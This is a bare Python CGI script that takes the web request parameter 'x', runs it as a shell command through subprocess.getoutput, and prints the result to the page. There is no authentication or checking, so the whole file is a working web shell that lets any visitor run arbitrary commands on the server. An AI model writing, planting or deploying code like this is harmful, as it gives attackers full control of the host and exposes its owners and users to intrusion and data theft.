
import cgi
import subprocess
import time

print("content-type: text/html")
print()

k = cgi.FieldStorage()
cmd = k.getvalue("x")

o = subprocess.getoutput(cmd)
print(o)